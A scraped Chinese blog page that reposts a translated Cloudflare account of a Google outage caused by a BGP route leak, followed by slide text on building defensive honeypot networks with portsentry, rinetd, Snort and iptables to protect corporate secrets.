<p>我开始网络层查找问题，看看是否是在这个通信层出了问题。
PING 216.239.32.10 (216.239.32.10): 56 data bytes</p>
<p>Request timeout for icmp_seq 0</p>
<p>92 bytes from 1-1-15.edge2-eqx-sin.moratelindo.co.id (202.43.176.217): Time to live exceeded</p>
<p>这里出现了奇怪的信息。通常，我们不应该在谷歌的路由信息中看到一个印度尼西亚的网络服务提供商(Moratel)的名字。我立即进入一个CloudFlare的路由器中查看发生了什么事。与此同时，Twitter上世界其它地方的报告显示了我们并不是唯一遇到问题的地方。</p>
<p><strong>互联网路由</strong></p>
<p>为了理解是出了什么问题，你需要知道一些互联网是如何工作的基础知识。整个互联网是由很多的网络组成，这些网络被称为是“自治系统(AS)”。每个网络都有一个唯一的数字来标志自己，被称为AS号。CloudFlare的AS号是13335，谷歌的AS号是15169。各个网络通过一种叫做边缘网关协议(BGP)的技术互相连接。边缘网关协议被称为是互联网的粘合剂——由它来声明哪个IP地址属于哪个网络，由它来建立从某个自治网络到另外一个自治网络的路由。一个互联网“路由”跟这个词的表意完全一样：由一个自治网络里的IP地址到另外一个自治网络里的另一个IP地址的路径。</p>
<p>边缘网关协议是基于一个相互信任的体制。各个网络基于信任的原则告诉其它网络哪个IP地址属于哪个网络。当你发送一个数据包，或发送一个穿越网络的请求，你的网络服务提供商会联系它的上游提供商或对等提供商，询问它们从你的网络服务提供商到网络目的地，哪条路线最近。</p>
<p>不幸的是，如果当一个网络发出声明说某个IP地址或某个网络在它的内部，而事实不是这样，如果它的上游网络或对等网络信任了它，那么，这个数据包最终将会迷路丢失。这里发生的就是这个问题。</p>
<p>我查看了边缘网关协议传递的谷歌IP的路由地址，路由指向了Moratel (23947)，一个印度尼西亚的网络服务提供商。我们的办公室在加利福尼亚，离谷歌的数据中心并不远，数据包绝不应该经过印度尼西亚。很有可能是，Moratel声明了一个错误的网络路由。</p>
<p>当时我看到的边缘网关协议发来的路由是：
p&gt;tom@edge01.sfo01&gt; show route 216.239.34.10</p>
<p>inet.0: 422168 destinations, 422168 routes (422154 active, 0 holddown, 14 hidden)</p>
<ul>
<li>= Active Route, - = Last Active, /* = Both</li>
</ul>
<p>216.239.34.0/24 /*[BGP/170] 00:15:47, MED 18, localpref 100</p>
<p>AS path: 4436 3491 23947 15169 I</p>
<blockquote>
<p>to 69.22.153.1 via ge-1/0/9.0</p>
</blockquote>
<p>我查看了其它路由，比如谷歌的公共DNS，它同样被劫持到了相同的(不正确的)路径：</p>
<p>inet.0: 422196 destinations, 422196 routes (422182 active, 0 holddown, 14 hidden)</p>
<ul>
<li>= Active Route, - = Last Active, /* = Both</li>
</ul>
<p>8.8.8.0/24 /*[BGP/170] 00:27:02, MED 18, localpref 100</p>
<p>AS path: 4436 3491 23947 15169 I</p>
<blockquote>
<p>to 69.22.153.1 via ge-1/0/9.0</p>
</blockquote>
<p>tom@edge01.sfo01&gt; show route 8.8.8.8</p>
<p><strong>路由泄漏</strong></p>
<p>像这样的问题在行业内被认为是起源于“路由泄漏”，不是正常的，而是“泄漏”出来的路由。这种事情并不是没有先例。谷歌之前曾遭受过类似的宕机事件，当时推测是巴基斯坦为了禁止YouTube上的一个视频，巴基斯坦国家ISP删除了YouTube网站的路由信息。不幸的是，他们的这种做法被传递到了外部，巴基斯坦电信公司的上游提供商——电讯盈科(PCCW)信任了巴基斯坦电信公司的做法，把这种路由方式传递到了整个互联网。这个事件导致了YouTube网站大约2个小时不能访问。</p>
<p><img src="&quot;胖手指 辛普森&quot;" alt="胖手指 辛普森"></p>
<p>今天发生的事情属于类似情况。在Moratel公司的某个人很可能是“胖手指”，输错了互联网路由。而电讯盈科，Moratel公司的上游提供商，信任了Moratel公司传递给他们的路由。很快，这错误的路由就传到了整个互联网。在边缘网关协议这种信任模式中，与其说这是恶意的行为，不如说这是误操作或失误。</p>
<p><strong>修复</strong></p>
<p>解决方案就是让Moratel公司停止声明错误的路由。作为一个网络工程师，尤其是像CloudFlare这样的大网络公司里工作的工程师，很大一部分工作就是和其它世界各地的网络工程师保持联络。当探明问题后，我联系到了Moratel公司的一位同事，告诉他发生了什么事。他大概在太平洋标准时间下午6：50分/世界标准时间凌晨2：50分修复了这个问题。3分钟后，路由恢复了正常，谷歌的服务重新可以工作了。</p>
<p>从网络传输图上观察，我估计全球整个互联网用户的3-5%收到了此次宕机事故的影响。重灾区是香港，因为那是电讯盈科的总部。如果你所处的地区在当时无法访问谷歌的服务，你现在应该知道是什么原因了。</p>
<p><strong>构建更好的互联网</strong></p>
<p>我说这些就是想让大家知道我们的互联网上如何在一个相互信任的机制下建立起来的。今天的事故说明，即使你是一个像谷歌这样的大公司，外部你无法掌控的因素也会影响到你的用户，让他们无法访问你，所以，一个网络技术小组是非常必要的，由他们来监控路由，管理你与世界的联系。CloudFlare公司每天的工作就是确保客户得到最佳的路由。我们照看互联网上的所有网站，确保他们的以最快传输速度提供服务。今天的事情只是我们工作内容的一个小片段。</p>
<p>译文出自：<a href="http://www.aqee.net/why-google-went-offline-today-and-a-bit-about-how-the-internet-works/" target="_blank">外刊IT评论</a></p>
<p>英文出自：<a href="http://blog.cloudflare.com/why-google-went-offline-today-and-a-bit-about" target="_blank">Cloudflare</a></p>
<p>[分享到</p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p> 0
](<a href="http://www.bshare.cn/share" target="_blank">http://www.bshare.cn/share</a>)
顶 4 踩 0</p>
<p>推荐阅读相关主题： <a href="http://www.csdn.net/article/tag/%E5%B7%A5%E4%BD%9C" title="工作" target="_blank">工作</a> <a href="http://www.csdn.net/article/tag/dns%E6%9C%8D%E5%8A%A1%E5%99%A8" title="dns服务器" target="_blank">dns服务器</a> <a href="http://www.csdn.net/article/tag/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83" title="数据中心" target="_blank">数据中心</a> <a href="http://www.csdn.net/article/tag/%E8%B7%AF%E7%94%B1%E5%99%A8" title="路由器" target="_blank">路由器</a> <a href="http://www.csdn.net/article/tag/%E7%94%B5%E4%BF%A1" title="电信" target="_blank">电信</a></p>
<h2 id="-"> </h2>
<ul>
<li>相关文章</li>
<li><p>最新报道</p>
</li>
<li><p><a href="&quot;从谷歌宕机事件认识互联网工作原理&quot;">从谷歌宕机事件认识互联网工作原理</a></p>
</li>
<li><a href="http://www.csdn.net/article/2012-11-21/2812054" title="第二期：“自动避免Namenode的单点故障导致的集群不可用”获奖公布" target="_blank">第二期：“自动避免Namenode的单点故障导致的集群不可用”获奖公布</a></li>
<li><a href="http://www.csdn.net/article/2012-11-20/2812013-apple-google-datacenter-hongkong" title="Apple将在2013年启动香港数据中心的建设" target="_blank">Apple将在2013年启动香港数据中心的建设</a></li>
<li><a href="http://www.csdn.net/article/2012-11-20/2811887-writing-fast-memory-efficient-javascript" title="[实战分析] 编写高效的JavaScript程序" target="_blank">[实战分析] 编写高效的JavaScript程序</a></li>
<li><a href="http://www.csdn.net/article/2012-11-16/2811963-facebook-datacenter" title="Facebook数据中心：气冷也能在高温下运行良好" target="_blank">Facebook数据中心：气冷也能在高温下运行良好</a></li>
<li><p><a href="http://www.csdn.net/article/2012-11-11/2811660-android4.2-jelly-bean" title="揭秘Android 4.2 开发者的天堂与地狱" target="_blank">揭秘Android 4.2 开发者的天堂与地狱</a></p>
</li>
<li><p><a href="&quot;从谷歌宕机事件认识互联网工作原理&quot;">从谷歌宕机事件认识互联网工作原理</a></p>
</li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812219-the-making-of-warcraft-3" title="《Warcraft是怎样炼成的（三）》：从Demo到游戏" target="_blank">《Warcraft是怎样炼成的（三）》：从Demo到游戏</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812211-future-of-programming" title="应用示例和对象是编程的未来吗？" target="_blank">应用示例和对象是编程的未来吗？</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812204-Why-HTML5-provided-more-tricks-than-trea" title="为什么2012年HTML5发展远未达预期" target="_blank">为什么2012年HTML5发展远未达预期</a></li>
<li><a href="http://www.csdn.net/article/2012-11-23/2812180" title="[周报第40期]Amazon环境恶劣为何还能保持创新与成功？" target="_blank">[周报第40期]Amazon环境恶劣为何还能保持创新与成功？</a></li>
<li><a href="http://www.csdn.net/article/2012-11-23/2812176-CTO-Club-87" title="[CTO俱乐部87期]三人行架构分享：开源是背后的支柱" target="_blank">[CTO俱乐部87期]三人行架构分享：开源是背后的支柱</a></li>
</ul>
<h2 id="-"> </h2>
<p>已有2条评论</p>
<h3 id="-500-">还可以再输入500个字</h3>
<p><img src="" alt=""> 您还没有登录!  请<a href="">登录</a> 或<a href="https://passport.csdn.net/account/register" target="_blank">注册</a></p>
<h3 id="-"> </h3>
<ul>
<li>最新评论</li>
<li>最热评论</li>
</ul>
<p><a href="http://my.csdn.net/hejinlove" target="_blank"><img src="" alt=""></a> <a href="http://my.csdn.net/hejinlove" target="_blank">hejinlove</a> 55分钟前</p>
<p>长见识了
0票，来自<a href="">+1</a><a href="">更多</a> <a href="">回复</a></p>
<p><a href="http://weibo.com/u/1712448143" target="_blank"><img src="" alt=""></a> <a href="http://weibo.com/u/1712448143" target="_blank">猫公子他哥</a> 2小时前  来自 新浪微博</p>
<p>好文!
0票，来自<a href="">+1</a><a href="">更多</a> <a href="">回复</a>
共2个 共1页 <a href="">首页</a>  <a href="">上一页</a> <a href="">1</a> <a href="">下一页</a>  <a href="">末页</a></p>
<p>请您注意</p>
<ul>
<li>·自觉遵守：爱国、守法、自律、真实、文明的原则</li>
<li>·尊重网上道德，遵守《全国人大常委会关于维护互联网安全的决定》及中华人民共和国其他各项有关法律法规</li>
<li>·严禁发表危害国家安全，破坏民族团结、国家宗教政策和社会稳定，含侮辱、诽谤、教唆、淫秽等内容的作品</li>
<li>·承担一切因您的行为而直接或间接导致的民事或刑事法律责任</li>
<li>·您在CSDN新闻评论发表的作品，CSDN有权在网站内保留、转载、引用或者删除</li>
<li><p>·参与本评论即表明您已经阅读并接受上述条款</p>
</li>
<li><p>CSDN官方微信</p>
</li>
<li>扫描二维码,向CSDN吐槽</li>
<li>微信号：CSDNnews
<img src="" alt=""></li>
</ul>
<p><img src="" alt=""><a href="http://subject.csdn.net/programmer-ipad/" target="_blank">程序员杂志for iPad 免费下载</a>
<a href="http://www.csdn.net/article/lastnews" target="_blank">每日资讯快速浏览</a></p>
<h2 id="-"> </h2>
<p>微博关注</p>
<h2 id="-"> </h2>
<p>相关热门文章</p>
<ul>
<li><a href="http://www.csdn.net/article/2012-11-21/2812109-If-Amazon-has-a-bad-work-environment-wit" title="Amazon工作环境恶劣员工高流失率 为何却依然能持续成功和创新？" target="_blank">Amazon工作环境恶劣员工高流失率 为何却依然能持续成功和创新？</a></li>
<li><a href="http://www.csdn.net/article/2012-11-22/2812154-Ten-Trouble-Programmers" title="程序员的十大烦恼" target="_blank">程序员的十大烦恼</a></li>
<li><a href="http://www.csdn.net/article/2012-11-22/2812132-responsive-image" title="响应式图像技术与资源分享" target="_blank">响应式图像技术与资源分享</a></li>
<li><a href="http://www.csdn.net/article/2012-11-21/2812056-programmers" title="当程序不再工作时，程序员说" target="_blank">当程序不再工作时，程序员说</a></li>
<li><a href="http://www.csdn.net/article/2012-11-21/2812033-Systems-Programming-at-Twitter" title="Twitter的系统编程" target="_blank">Twitter的系统编程</a></li>
<li><a href="http://www.csdn.net/article/2012-11-23/2812174-5-Good-and-useful-.NET-Profilers" title="推荐5款超实用的.NET性能分析工具" target="_blank">推荐5款超实用的.NET性能分析工具</a></li>
<li><a href="http://www.csdn.net/article/2012-11-22/2812113-The-Nature-Of-Lisp" title="Lisp的本质" target="_blank">Lisp的本质</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812219-the-making-of-warcraft-3" title="《Warcraft是怎样炼成的（三）》：从Demo到游戏" target="_blank">《Warcraft是怎样炼成的（三）》：从Demo到游戏</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812204-Why-HTML5-provided-more-tricks-than-trea" title="为什么2012年HTML5发展远未达预期" target="_blank">为什么2012年HTML5发展远未达预期</a></li>
<li><a href="http://www.csdn.net/article/2012-11-26/2812211-future-of-programming" title="应用示例和对象是编程的未来吗？" target="_blank">应用示例和对象是编程的未来吗？</a></li>
</ul>
<h2 id="-"> </h2>
<p><a href="http://hui.csdn.net/" target="_blank">活动</a></p>
<p>11-26 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=174" target="_blank">交付创新的应用：CSDN年度创新应用访谈（CMDN Club /#22）</a> 11-30 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=173" target="_blank">IBM Rational 软件创新中国分享会—深圳站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=172" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动厦门站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=171" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动成都站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=170" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动深圳站</a> 11-22 <a href="http://hui.csdn.net/MeetingInfo.aspx?mid=169" target="_blank">2012移动互联网应用创新大赛开放日-全国六场联动南京站</a></p>
<h1 id="-">热门专区</h1>
<ul>
<li><a href="http://subject.csdn.net/win8hackathon/" target="_blank"><img src="" alt=""></a><a href="http://subject.csdn.net/win8hackathon/" target="_blank">win8开发马拉松</a></li>
<li><a href="http://g.csdn.net/5232350" target="_blank"><img src="" alt=""></a><a href="http://g.csdn.net/5232350" target="_blank">2012微软技术大会</a></li>
<li><a href="http://db2.csdn.net/" target="_blank"><img src="" alt=""></a><a href="http://db2.csdn.net/" target="_blank">数据库构架师专区</a></li>
<li><a href="http://www.aixdev.org/" target="_blank"><img src="" alt=""></a><a href="http://www.aixdev.org/" target="_blank">IBM AIX学院</a></li>
<li><a href="http://hc.csdn.net/" target="_blank"><img src="" alt=""></a><a href="http://hc.csdn.net/" target="_blank">异构编程专区</a></li>
</ul>
<p><a href="http://www.csdn.net/company/about.html" target="_blank">公司简介</a>|<a href="http://www.csdn.net/company/recruit.html" target="_blank">招贤纳士</a>|<a href="http://www.csdn.net/company/marketing.html" target="_blank">广告服务</a>|<a href="http://www.csdn.net/company/account.html" target="_blank">银行汇款帐号</a>|<a href="http://www.csdn.net/company/contact.html" target="_blank">联系方式</a>|<a href="http://www.csdn.net/company/statement.html" target="_blank">版权声明</a>|<a href="http://www.csdn.net/company/layer.html" target="_blank">法律顾问</a>|<a href="mailto:webmaster@csdn.net">问题报告</a>京 ICP 证 070598 号北京创新乐知信息技术有限公司 版权所有<img src="" alt=""> 联系邮箱：webmaster(at)csdn.netCopyright © 1999-2012, CSDN.NET, All Rights Reserved <a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202001032100010" target="_blank"><img src="" alt="GongshangLogo"></a></p>
<p><a href="http://www.bshare.cn/intro" target="_blank">分享到</a><a href="">X</a></p>
<p><a href="&quot;115收藏夹&quot;">115收藏夹</a></p>
<p><a href="&quot;139邮箱&quot;">139邮箱</a>
<a href="&quot;189邮箱&quot;">189邮箱</a></p>
<p><a href="&quot;手机快传&quot;">手机快传</a>
<a href="&quot;42区&quot;">42区</a></p>
<p><a href="&quot;豆瓣9点&quot;">豆瓣9点</a>
<a href="&quot;百度搜藏&quot;">百度搜藏</a></p>
<p><a href="&quot;百度空间&quot;">百度空间</a>
<a href="&quot;Google书签&quot;">Google书签</a></p>
<p><a href="&quot;一键通&quot;">一键通</a>
<a href="&quot;财迷&quot;">财迷</a></p>
<p><a href="&quot;中金微博&quot;">中金微博</a>
<a href="&quot;微长沙&quot;">微长沙</a></p>
<p><a href="&quot;车主微博&quot;">车主微博</a>
<a href="&quot;抽屉&quot;">抽屉</a></p>
<p><a href="&quot;复制网址&quot;">复制网址</a>
<a href="&quot;中青论坛&quot;">中青论坛</a></p>
<p><a href="&quot;创业吧&quot;">创业吧</a>
<a href="&quot;美味书签&quot;">美味书签</a></p>
<p><a href="&quot;点点网&quot;">点点网</a>
<a href="&quot;递客网&quot;">递客网</a></p>
<p><a href="&quot;Digg&quot;">Digg</a>
<a href="&quot;奇客发现&quot;">奇客发现</a></p>
<p><a href="&quot;Diigo&quot;">Diigo</a>
<a href="&quot;豆瓣网&quot;">豆瓣网</a></p>
<p><a href="&quot;梦幻人生&quot;">梦幻人生</a>
<a href="&quot;堆糖&quot;">堆糖</a></p>
<p><a href="&quot;东方微博&quot;">东方微博</a>
<a href="&quot;电子邮件&quot;">电子邮件</a></p>
<p><a href="&quot;Evernote&quot;">Evernote</a>
<a href="&quot;Facebook&quot;">Facebook</a></p>
<p><a href="&quot;饭否&quot;">饭否</a>
<a href="&quot;收藏夹&quot;">收藏夹</a></p>
<p><a href="&quot;飞信&quot;">飞信</a>
<a href="&quot;FriendFeed&quot;">FriendFeed</a></p>
<p><a href="&quot;Fwisp&quot;">Fwisp</a>
<a href="&quot;赶牛微博&quot;">赶牛微博</a></p>
<p><a href="&quot;Gmail&quot;">Gmail</a>
<a href="&quot;光明网&quot;">光明网</a></p>
<p><a href="&quot;光明微博&quot;">光明微博</a>
<a href="&quot;Google+&quot;">Google+</a></p>
<p><a href="&quot;谷歌翻译&quot;">谷歌翻译</a>
<a href="&quot;合肥微博&quot;">合肥微博</a></p>
<p><a href="&quot;黑米书签&quot;">黑米书签</a>
<a href="&quot;和讯微博&quot;">和讯微博</a></p>
<p><a href="&quot;花瓣&quot;">花瓣</a>
<a href="&quot;凤凰快博&quot;">凤凰快博</a></p>
<p><a href="&quot;凤凰微博&quot;">凤凰微博</a>
<a href="&quot;粉丝网&quot;">粉丝网</a></p>
<p><a href="&quot;Instapaper&quot;">Instapaper</a>
<a href="&quot;i贴吧&quot;">i贴吧</a></p>
<p><a href="&quot;开心集品&quot;">开心集品</a>
<a href="&quot;好愿网&quot;">好愿网</a></p>
<p><a href="&quot;微江苏&quot;">微江苏</a>
<a href="&quot;江西微博&quot;">江西微博</a></p>
<p><a href="&quot;开心网&quot;">开心网</a>
<a href="&quot;唠叨网&quot;">唠叨网</a></p>
<p><a href="&quot;雷猴&quot;">雷猴</a>
<a href="&quot;乐收&quot;">乐收</a></p>
<p><a href="&quot;乐知书签&quot;">乐知书签</a>
<a href="&quot;LinkedIn&quot;">LinkedIn</a></p>
<p><a href="&quot;MS Livespace&quot;">MS Livespace</a>
<a href="&quot;麦库记事&quot;">麦库记事</a></p>
<p><a href="&quot;麻辣微博&quot;">麻辣微博</a>
<a href="&quot;玛撒网&quot;">玛撒网</a></p>
<p><a href="&quot;美丽说&quot;">美丽说</a>
<a href="&quot;米聊&quot;">米聊</a></p>
<p><a href="&quot;明道&quot;">明道</a>
<a href="&quot;Mister Wong&quot;">Mister Wong</a></p>
<p><a href="&quot;蘑菇街&quot;">蘑菇街</a>
<a href="&quot;猫扑推客&quot;">猫扑推客</a></p>
<p><a href="&quot;MSN&quot;">MSN</a>
<a href="&quot;MyShare&quot;">MyShare</a></p>
<p><a href="&quot;MySpace&quot;">MySpace</a>
<a href="&quot;网易微博&quot;">网易微博</a></p>
<p><a href="&quot;Netvibes&quot;">Netvibes</a>
<a href="&quot;人民微博&quot;">人民微博</a></p>
<p><a href="&quot;Pinterest&quot;">Pinterest</a>
<a href="&quot;Poco网&quot;">Poco网</a></p>
<p><a href="&quot;打印&quot;">打印</a>
<a href="&quot;Print Friendly&quot;">Print Friendly</a></p>
<p><a href="&quot;奇乐收藏&quot;">奇乐收藏</a>
<a href="&quot;腾讯微博&quot;">腾讯微博</a></p>
<p><a href="&quot;QQ书签&quot;">QQ书签</a>
<a href="&quot;朋友网&quot;">朋友网</a></p>
<p><a href="&quot;QQ空间&quot;">QQ空间</a>
<a href="&quot;ReadItLater&quot;">ReadItLater</a></p>
<p><a href="&quot;Reddit&quot;">Reddit</a>
<a href="&quot;红微博&quot;">红微博</a></p>
<p><a href="&quot;人间网&quot;">人间网</a>
<a href="&quot;人脉库&quot;">人脉库</a></p>
<p><a href="&quot;人人网&quot;">人人网</a>
<a href="&quot;手机&quot;">手机</a></p>
<p><a href="&quot;新浪微博&quot;">新浪微博</a>
<a href="&quot;新浪Qing&quot;">新浪Qing</a></p>
<p><a href="&quot;新浪Vivi&quot;">新浪Vivi</a>
<a href="&quot;搜狐白社会&quot;">搜狐白社会</a></p>
<p><a href="&quot;搜狐随身看&quot;">搜狐随身看</a>
<a href="&quot;搜狐微博&quot;">搜狐微博</a></p>
<p><a href="&quot;南方微博&quot;">南方微博</a>
<a href="&quot;StumbleUpon&quot;">StumbleUpon</a></p>
<p><a href="&quot;深圳微博&quot;">深圳微博</a>
<a href="&quot;守株网&quot;">守株网</a></p>
<p><a href="&quot;淘江湖&quot;">淘江湖</a>
<a href="&quot;天际网&quot;">天际网</a></p>
<p><a href="&quot;天涯&quot;">天涯</a>
<a href="&quot;同学微博&quot;">同学微博</a></p>
<p><a href="&quot;推他&quot;">推他</a>
<a href="&quot;Tumblr&quot;">Tumblr</a></p>
<p><a href="&quot;Twitter&quot;">Twitter</a>
<a href="&quot;优士网&quot;">优士网</a></p>
<p><a href="&quot;挖客&quot;">挖客</a>
<a href="&quot;玩啥e族&quot;">玩啥e族</a></p>
<p><a href="&quot;若邻网&quot;">若邻网</a>
<a href="&quot;WO+分享&quot;">WO+分享</a></p>
<p><a href="&quot;我烧网&quot;">我烧网</a>
<a href="&quot;鲜果网&quot;">鲜果网</a></p>
<p><a href="&quot;校媒采通&quot;">校媒采通</a>
<a href="&quot;新华微博&quot;">新华微博</a></p>
<p><a href="&quot;新民微博&quot;">新民微博</a>
<a href="&quot;微博校园&quot;">微博校园</a></p>
<p><a href="&quot;摇篮微博&quot;">摇篮微博</a>
<a href="&quot;移动微博&quot;">移动微博</a></p>
<p><a href="&quot;易集网&quot;">易集网</a>
<a href="&quot;有道书签&quot;">有道书签</a></p>
<p><a href="&quot;有道笔记&quot;">有道笔记</a>
<a href="&quot;浙江微博&quot;">浙江微博</a>
<a href="http://www.bshare.cn/bShareBox" target="_blank">查看我的分享...</a></p>
<p><a href="http://www.bshare.cn/" target="_blank">bShare</a>
<a href="http://www.bshare.cn/intro" target="_blank">分享到</a><a href="">X</a></p>
<p><a href="">腾讯微博</a></p>
<p><a href="">一键通</a>
<a href="">新浪微博</a></p>
<p><a href="&quot;QQ空间&quot;">QQ空间</a></p>
<p><a href="&quot;人人网&quot;">人人网</a>
<a href="&quot;天涯&quot;">天涯</a></p>
<p><a href="&quot;凤凰微博&quot;">凤凰微博</a>
<a href="&quot;朋友网&quot;">朋友网</a></p>
<p><a href="&quot;人民微博&quot;">人民微博</a>
<a href="&quot;豆瓣网&quot;">豆瓣网</a>
<a href="&quot;搜狐微博&quot;">搜狐微博</a></p>
<p><a href="&quot;新华微博&quot;">新华微博</a>
<a href="&quot;手机&quot;">手机</a></p>
<p><a href="&quot;网易微博&quot;">网易微博</a>
<a href="&quot;开心网&quot;">开心网</a></p>
<p><a href="&quot;百度空间&quot;">百度空间</a>
<a href="&quot;有道笔记&quot;">有道笔记</a>
更多平台... (127)</p>
<p><a href="http://www.bshare.cn/" target="_blank">bShare</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--企业秘密保护与陷阱网络10/">企业秘密保护与陷阱网络1.0</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--企业秘密保护与陷阱网络10/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-1-0">企业秘密保护与陷阱网络1.0</h1>
<p><img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 企业秘密保护与陷阱网络
吴鲁加 <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x77;&#117;&#x6c;&#117;&#106;&#105;&#x61;&#64;&#x75;&#x6e;&#x6e;&#111;&#x6f;&#46;&#99;&#111;&#109;">&#x77;&#117;&#x6c;&#117;&#106;&#105;&#x61;&#64;&#x75;&#x6e;&#x6e;&#111;&#x6f;&#46;&#99;&#111;&#109;</a>
<img src="" alt=""> <img src="" alt=""> 提纲
• • • • • 简单陷阱网络的构建与应用实例 企业 / 组织对秘密保护的要求 攻击路径假想 自防御型陷阱网络 总结与展望
第 2页
<img src="" alt=""> <img src="" alt=""> 用户需求与目标
• 需求
–服务器上保存有重要数据 –必须允许远程接入 –经常遇到大量扫描尝试
• 目标
–将进行扫描的 IP 地址屏蔽 –必要时研究该 IP 的址的目标
第 3页
<img src="" alt=""> <img src="" alt=""> 配置
• 工具
–portsentry –rinetd –VMWare
• 思路
–默认启动 portsentry 对扫描行为进行监视
• KILL_RUN_CMD=”/usr/sbin/rinetd&quot;
–发现攻击企图后，启动 rinetd 转向 ViruteHoneynet
• 0.0.0.0 1433 192.168.0.55 1433 • logfile /var/log/rinetd.log
第 4页
<img src="" alt=""> <img src="" alt=""> 效果
• 攻击
–攻击者对 MSSQL 服务器进行攻击 –sa 密码为 123456
• 记录
–Portsentry 、 rinetd 日志 –MSSQL 操作日志 –截图
第 5页
<img src="" alt=""> <img src="" alt=""> 典型高科技企业的知识产权结构
• 金字塔结构
–专利权 –著作权 –商业秘密
第 6页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 企业技术秘密的窥视者
第 7页
<img src="" alt=""> <img src="" alt=""> 技术秘密的保护标准
• 法律的要求：“权利人采取保密措施”
–保护标准：除非经权利人许可，否则他人不能以合法渠 道获得 –保护基线：只需采取基本的、适度的保密措施即可，如 保密协议、保密管理规定
• 管理的要求：他人不能从权利人获得
–保护标准：除非经权利人许可，否则他人不能获得 –保护基线：需要采取大量系统化的保护措施
第 8页
<img src="" alt=""> <img src="" alt=""> 企业对技术秘密的保护要求
• 要求
–不该获得的人不能获得 –获得的人拿不出去 –拿出去的必然合法及合乎企业规范 –非法拿出去必须有痕迹
• 防护措施
–技术 ( 我们的重心 ) ，陷阱网络能做到
• 避免信息被“非法”获取 • 减少信息被“骚扰”的机率 • 保证“非法”获取有记录
–管理
第 9页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 外部黑客的攻击手段
第 10页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 内部员工攻击手段
第 11页
<img src="" alt=""> <img src="" alt=""> 自防御型陷阱网络思路
• 从前面简单的 Honeypot 设置进一步设想 • 从各种 AntiDDoS 设备的宣传
–下水道路由
第 12页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> ADDN 网络抵御 DDoS 攻击
来源 :ADDN 网络抵御 DDoS 攻击 ( 刘闻欢 ) 第 13页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 自防御型陷阱的基本设计
第 14页
<img src="" alt=""> <img src="" alt=""> 三个技术核心部份
• Unnoo 陷阱网关 • Honeyd 服务器构成的虚拟网络 • 虚拟机构成的 Honeypot 组
第 15页
<img src="" alt=""> <img src="" alt=""> 自防御型 NAT 陷阱网关的构成
• 策略控制
–Snort 、 SnortSam
• NAT
–iptables
• 数据分析
–Sebek
第 16页
<img src="" alt=""> <img src="" alt=""> 基于时间的控制
• 主要应用范围
–保密单位 –访问策略可以按时间定义的网络
• 技术实现
–crontab 添加及删除规则
• 应用特点
–内容级 Honeypot –主要对象是内部“违规者”
第 17页
<img src="" alt=""> <img src="" alt=""> 虚拟机
• VMWare • UML(UserModLinux)
第 18页
<img src="" alt=""> <img src="" alt=""> 基于协议和开放端口的控制
• 主要应用范围
–网络协议固定的单位（银行、证券、运营商等） –前提是需要做好应用及端口管理
• 技术实现
–iptables 直接将访问目标无效协议端口的数据 NAT 转发
• 应用特点
–网络级 Honeypot ，可以与 Honeyd 结合应用 –主要对象是已经进入内部网络的“渗透者”
第 19页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> Honeyd(1)
第 20页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> honeyd(2)
第 21页
<img src="" alt=""> <img src="" alt=""> 基于 IP 地址的控制
• 主要应用范围
–特定高安全级别的设备及网络，如网管
• 技术实现
–直接采用 iptables 设置 NAT 规则
• 应用特点
–应用对象是所有有意无意的“试探者”
第 22页
<img src="" alt=""> <img src="" alt=""> 基于扫描和攻击的访问控制
• 主要应用范围
–保密单位、实验机构等 –技术研究组织更倾向于研究这类型的攻击
• 技术实现
–发现工具
• 扫描： portsentry • 攻击： Snort
–联动工具
• SnortSam
• 应用特点
–应用对象是所有目的明确的“攻击者”
第 23页
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> SnortSam 和 iptables
• SnortSam
–ssp_iptables.c –基于攻击报文的 NAT –能够结合 Checkpoint 等
• iptables
–灵活高效，有大量的配置工具
第 24页
